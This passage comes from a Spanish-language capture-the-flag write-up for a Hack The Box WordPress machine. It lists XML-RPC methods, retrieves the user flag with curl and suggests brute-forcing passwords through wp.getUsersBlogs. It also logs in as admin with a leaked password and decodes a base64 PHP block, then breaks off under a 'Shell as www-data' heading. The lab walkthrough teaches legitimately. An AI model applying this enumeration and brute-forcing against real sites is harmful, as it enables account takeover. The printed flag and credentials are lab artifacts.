    &lt;param&gt;
      &lt;value&gt;
      &lt;array&gt;&lt;data&gt;
  &lt;value&gt;&lt;string&gt;system.multicall&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;system.getCapabilities&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;htb.get_flag&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;demo.addTwoNumbers&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;demo.sayHello&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.getTrackbackPings&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.supportedTextFilters&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.supportedMethods&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.setPostCategories&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.getPostCategories&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.getRecentPostTitles&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;mt.getCategoryList&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.deletePost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.newMediaObject&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.getCategories&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.getRecentPosts&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.getPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.editPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;metaWeblog.newPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.deletePost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.editPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.newPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.getRecentPosts&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.getPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.getUserInfo&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;blogger.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.restoreRevision&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getRevisions&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPostTypes&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPostType&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPostFormats&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getMediaLibrary&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getMediaItem&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getCommentStatusList&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.newComment&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.editComment&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deleteComment&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getComments&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getComment&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.setOptions&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getOptions&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPageTemplates&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPageStatusList&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPostStatusList&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getCommentCount&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deleteFile&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.uploadFile&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.suggestCategories&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deleteCategory&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.newCategory&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getTags&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getCategories&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getAuthors&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPageList&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.editPage&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deletePage&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.newPage&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPages&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPage&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.editProfile&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getProfile&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getUsers&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getUser&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getTaxonomies&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getTaxonomy&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getTerms&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getTerm&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deleteTerm&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.editTerm&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.newTerm&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPosts&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt;
  &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
&lt;/data&gt;&lt;/array&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodResponse&gt;
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>
    <p>Bueno vemos todos los m√©todos este es interesante <code class="language-plaintext highlighter-rouge">&lt;value&gt;&lt;string&gt;htb.get_flag&lt;/string&gt;&lt;/value&gt;</code>.</p>
  </li>
  <li>
    <p>Podemos ver la <code class="language-plaintext highlighter-rouge">user flag</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap curl <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"&lt;methodCall&gt;&lt;methodName&gt;htb.get_flag&lt;/methodName&gt;&lt;params&gt;&lt;/params&gt;&lt;/methodCall&gt;"</span> http://10.10.11.142/xmlrpc.php
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;methodResponse&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
      &lt;string&gt;14a81d1565421c5c1461e1ad9b182b5b
&lt;/string&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodResponse&gt;
</code></pre></div></div>

<ul>
  <li>Tambi√©n podemos enumerar usuarios en otras m√°quinas donde esto esta activado te puedes hacer un script en <code class="language-plaintext highlighter-rouge">bash</code> que haga fuerza bruta en caso de que conozcas el nombre de un usuario para saber la contrase√±a.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap curl <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;administrator&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;pass&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;"</span> http://10.10.11.142/xmlrpc.php
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;methodResponse&gt;
  &lt;fault&gt;
    &lt;value&gt;
      &lt;struct&gt;
        &lt;member&gt;
          &lt;name&gt;faultCode&lt;/name&gt;
          &lt;value&gt;&lt;int&gt;403&lt;/int&gt;&lt;/value&gt;
        &lt;/member&gt;
        &lt;member&gt;
          &lt;name&gt;faultString&lt;/name&gt;
          &lt;value&gt;&lt;string&gt;Incorrect username or password.&lt;/string&gt;&lt;/value&gt;
        &lt;/member&gt;
      &lt;/struct&gt;
    &lt;/value&gt;
  &lt;/fault&gt;
&lt;/methodResponse&gt;
</code></pre></div></div>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<ul>
  <li>
    <p>Desde Python tambi√©n se puede trabajar con esto.</p>
  </li>
  <li>
    <p>En caso de tener errores tu script debe verse as√≠.</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/</span><span class="p">.</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="p">.</span><span class="mi">11</span><span class="o">/</span><span class="n">site</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">wordpress_xmlrpc</span><span class="o">/</span><span class="n">base</span><span class="p">.</span><span class="n">py</span>
<span class="kn">import</span> <span class="n">collections.abc</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="kn">from</span> <span class="n">wordpress_xmlrpc.compat</span> <span class="kn">import</span> <span class="n">xmlrpc_client</span><span class="p">,</span> <span class="n">dict_type</span>
<span class="kn">from</span> <span class="n">wordpress_xmlrpc.exceptions</span> <span class="kn">import</span> <span class="n">ServerConnectionError</span><span class="p">,</span> <span class="n">UnsupportedXmlrpcMethodError</span><span class="p">,</span> <span class="n">InvalidCredentialsError</span><span class="p">,</span> <span class="n">XmlrpcDisabledError</span>


<span class="k">class</span> <span class="nc">Client</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">
    Connection to a WordPress XML-RPC API endpoint.

    To execute XML-RPC methods, pass an instance of an
    `XmlrpcMethod`-derived class to `Client`</span><span class="sh">'</span><span class="s">s `call` method.
    </span><span class="sh">"""</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">url</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">blog_id</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">transport</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span>
        <span class="n">self</span><span class="p">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
        <span class="n">self</span><span class="p">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
        <span class="n">self</span><span class="p">.</span><span class="n">blog_id</span> <span class="o">=</span> <span class="n">blog_id</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">server</span> <span class="o">=</span> <span class="n">xmlrpc_client</span><span class="p">.</span><span class="nc">ServerProxy</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">allow_none</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">transport</span><span class="o">=</span><span class="n">transport</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="n">supported_methods</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">server</span><span class="p">.</span><span class="n">mt</span><span class="p">.</span><span class="nf">supportedMethods</span><span class="p">()</span>
        <span class="k">except</span> <span class="n">xmlrpc_client</span><span class="p">.</span><span class="n">ProtocolError</span><span class="p">:</span>
            <span class="n">e</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="nf">exc_info</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
            <span class="k">raise</span> <span class="nc">ServerConnectionError</span><span class="p">(</span><span class="nf">repr</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">call</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">method</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">method</span><span class="p">.</span><span class="n">method_name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">self</span><span class="p">.</span><span class="n">supported_methods</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nc">UnsupportedXmlrpcMethodError</span><span class="p">(</span><span class="n">method</span><span class="p">.</span><span class="n">method_name</span><span class="p">)</span>

        <span class="n">server_method</span> <span class="o">=</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">server</span><span class="p">,</span> <span class="n">method</span><span class="p">.</span><span class="n">method_name</span><span class="p">)</span>
        <span class="n">args</span> <span class="o">=</span> <span class="n">method</span><span class="p">.</span><span class="nf">get_args</span><span class="p">(</span><span class="n">self</span><span class="p">)</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">raw_result</span> <span class="o">=</span> <span class="nf">server_method</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">xmlrpc_client</span><span class="p">.</span><span class="n">Fault</span><span class="p">:</span>
            <span class="n">e</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="nf">exc_info</span><span class="p">()[</span><span class="mi">1</span><span class="p">]</span>
            <span class="k">if</span> <span class="n">e</span><span class="p">.</span><span class="n">faultCode</span> <span class="o">==</span> <span class="mi">403</span><span class="p">:</span>
                <span class="k">raise</span> <span class="nc">InvalidCredentialsError</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">faultString</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">e</span><span class="p">.</span><span class="n">faultCode</span> <span class="o">==</span> <span class="mi">405</span><span class="p">:</span>
                <span class="k">raise</span> <span class="nc">XmlrpcDisabledError</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">faultString</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">raise</span>
        <span class="k">return</span> <span class="n">method</span><span class="p">.</span><span class="nf">process_result</span><span class="p">(</span><span class="n">raw_result</span><span class="p">)</span>


<span class="k">class</span> <span class="nc">XmlrpcMethod</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">
    Base class for XML-RPC methods.

    Child classes can override methods and properties to customize behavior:

    Properties:
        * `method_name`: XML-RPC method name (e.g., </span><span class="sh">'</span><span class="s">wp.getUserInfo</span><span class="sh">'</span><span class="s">)
        * `method_args`: Tuple of method-specific required parameters
        * `optional_args`: Tuple of method-specific optional parameters
        * `results_class`: Python class which will convert an XML-RPC response dict into an object
    </span><span class="sh">"""</span>
    <span class="n">method_name</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="n">method_args</span> <span class="o">=</span> <span class="nf">tuple</span><span class="p">()</span>
    <span class="n">optional_args</span> <span class="o">=</span> <span class="nf">tuple</span><span class="p">()</span>
    <span class="n">results_class</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">method_args</span> <span class="ow">or</span> <span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">:</span>
                <span class="n">max_num_args</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span><span class="p">)</span> <span class="o">+</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">)</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="nf">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="n">max_num_args</span><span class="p">):</span>
                    <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">Invalid number of parameters to %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">method_name</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">args</span><span class="p">)</span> <span class="o">!=</span> <span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span><span class="p">):</span>
                    <span class="k">raise</span> <span class="nc">ValueError</span><span class="p">(</span><span class="sh">"</span><span class="s">Invalid number of parameters to %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">method_name</span><span class="p">)</span>

            <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">arg_name</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span><span class="p">):</span>
                <span class="nf">setattr</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">arg_name</span><span class="p">,</span> <span class="n">args</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>

            <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">:</span>
                <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">arg_name</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="nf">len</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span><span class="p">)):</span>
                    <span class="k">if</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="nf">len</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
                        <span class="k">break</span>
                    <span class="nf">setattr</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">arg_name</span><span class="p">,</span> <span class="n">args</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>

        <span class="k">if</span> <span class="sh">'</span><span class="s">results_class</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">kwargs</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="n">results_class</span> <span class="o">=</span> <span class="n">kwargs</span><span class="p">[</span><span class="sh">'</span><span class="s">results_class</span><span class="sh">'</span><span class="p">]</span>

    <span class="k">def</span> <span class="nf">default_args</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">client</span><span class="p">):</span>
        <span class="sh">"""</span><span class="s">
        Builds set of method-non-specific arguments.
        </span><span class="sh">"""</span>
        <span class="k">return</span> <span class="nf">tuple</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">get_args</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">client</span><span class="p">):</span>
        <span class="sh">"""</span><span class="s">
        Builds final set of XML-RPC method arguments based on
        the method</span><span class="sh">'</span><span class="s">s arguments, any default arguments, and their
        defined respective ordering.
        </span><span class="sh">"""</span>
        <span class="n">default_args</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="nf">default_args</span><span class="p">(</span><span class="n">client</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">method_args</span> <span class="ow">or</span> <span class="n">self</span><span class="p">.</span><span class="n">optional_args</span><span class="p">:</span>
            <span class="n">optional_args</span> <span class="o">=</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="sh">'</span><span class="s">optional_args</span><span class="sh">'</span><span class="p">,</span> <span class="nf">tuple</span><span class="p">())</span>
            <span class="n">args</span> <span class="o">=</span> <span class="p">[]</span>
            <span class="k">for</span> <span class="n">arg</span> <span class="ow">in</span> <span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">method_args</span> <span class="o">+</span> <span class="n">optional_args</span><span class="p">):</span>
                <span class="k">if</span> <span class="nf">hasattr</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
                    <span class="n">obj</span> <span class="o">=</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">)</span>
                    <span class="k">if</span> <span class="nf">hasattr</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="sh">'</span><span class="s">struct</span><span class="sh">'</span><span class="p">):</span>
                        <span class="n">args</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">obj</span><span class="p">.</span><span class="n">struct</span><span class="p">)</span>
                    <span class="k">else</span><span class="p">:</span>
                        <span class="n">args</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
            <span class="n">args</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="n">default_args</span><span class="p">)</span> <span class="o">+</span> <span class="n">args</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">args</span> <span class="o">=</span> <span class="n">default_args</span>

        <span class="k">return</span> <span class="n">args</span>

    <span class="k">def</span> <span class="nf">process_result</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">raw_result</span><span class="p">):</span>
        <span class="sh">"""</span><span class="s">
        Performs actions on the raw result from the XML-RPC response.

        If a `results_class` is defined, the response will be converted
        into one or more object instances of that class.
        </span><span class="sh">"""</span>
        <span class="k">if</span> <span class="n">self</span><span class="p">.</span><span class="n">results_class</span> <span class="ow">and</span> <span class="n">raw_result</span><span class="p">:</span>
            <span class="k">if</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">raw_result</span><span class="p">,</span> <span class="n">dict_type</span><span class="p">):</span>
                <span class="k">return</span> <span class="n">self</span><span class="p">.</span><span class="nf">results_class</span><span class="p">(</span><span class="n">raw_result</span><span class="p">)</span>
            <span class="k">elif</span> <span class="nf">isinstance</span><span class="p">(</span><span class="n">raw_result</span><span class="p">,</span> <span class="n">collections</span><span class="p">.</span><span class="n">abc</span><span class="p">.</span><span class="n">Iterable</span><span class="p">):</span>
                <span class="k">return</span> <span class="p">[</span><span class="n">self</span><span class="p">.</span><span class="nf">results_class</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="k">for</span> <span class="n">result</span> <span class="ow">in</span> <span class="n">raw_result</span><span class="p">]</span>

        <span class="k">return</span> <span class="n">raw_result</span>


<span class="k">class</span> <span class="nc">AnonymousMethod</span><span class="p">(</span><span class="n">XmlrpcMethod</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">
    An XML-RPC method for which no authentication is required.
    </span><span class="sh">"""</span>
    <span class="k">pass</span>


<span class="k">class</span> <span class="nc">AuthenticatedMethod</span><span class="p">(</span><span class="n">XmlrpcMethod</span><span class="p">):</span>
    <span class="sh">"""</span><span class="s">
    An XML-RPC method for which user authentication is required.

    Blog ID, username and password details will be passed from
    the `Client` instance to the method call.
    </span><span class="sh">"""</span>

    <span class="k">def</span> <span class="nf">default_args</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">client</span><span class="p">):</span>
        <span class="nf">return </span><span class="p">(</span><span class="n">client</span><span class="p">.</span><span class="n">blog_id</span><span class="p">,</span> <span class="n">client</span><span class="p">.</span><span class="n">username</span><span class="p">,</span> <span class="n">client</span><span class="p">.</span><span class="n">password</span><span class="p">)</span>

</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap pip3 <span class="nb">install </span>python-wordpress-xmlrpc
</code></pre></div></div>

<ul>
  <li>Vamos a importar Client para poder conectarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  nmap python3
Python 3.11.9 <span class="o">(</span>main, Apr 10 2024, 13:16:36<span class="o">)</span> <span class="o">[</span>GCC 13.2.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span> from wordpress_xmlrpc import Client
</code></pre></div></div>

<ul>
  <li>Si queremos usar un m√©todo como el posts para los posts del <code class="language-plaintext highlighter-rouge">wordpress</code> lo hacemos de la siguiente forma.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> from wordpress_xmlrpc.methods import posts
</code></pre></div></div>

<ul>
  <li>Ahora nos autenticamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> client <span class="o">=</span> Client<span class="o">(</span><span class="s2">"http://10.10.11.142/xmlrpc.php"</span>, <span class="s2">"admin"</span>, <span class="s2">"uhc-jan-finals-2022"</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora podemos ver los posts.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> post <span class="o">=</span> client.call<span class="o">(</span>posts.GetPosts<span class="o">())</span>
<span class="o">&gt;&gt;&gt;</span> post
<span class="o">[</span>&lt;WordPressPost: b<span class="s1">'UHC January Finals Under Way'</span><span class="o">&gt;]</span>
</code></pre></div></div>

<ul>
  <li>Podemos analizar el contenido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> post[0].content
<span class="s1">'&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /--&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;\n\n&lt;!-- wp:paragraph --&gt;\n&lt;p&gt;&lt;/p&gt;\n&lt;!-- /wp:paragraph --&gt;'</span>
</code></pre></div></div>

<ul>
  <li>Vemos una cadena en base64 vamos a hacer un <code class="language-plaintext highlighter-rouge">decode</code> para ver que es.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ <span class="nb">echo</span> <span class="s2">"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U="</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo</span>
%3C%3Fphp%20%20echo<span class="o">(</span>file_get_contents<span class="o">(</span><span class="s1">'%2Fvar%2Fwww%2Fhtml%2Foutput.log'</span><span class="o">))</span>%3B%20%3F%3E
</code></pre></div></div>

<ul>
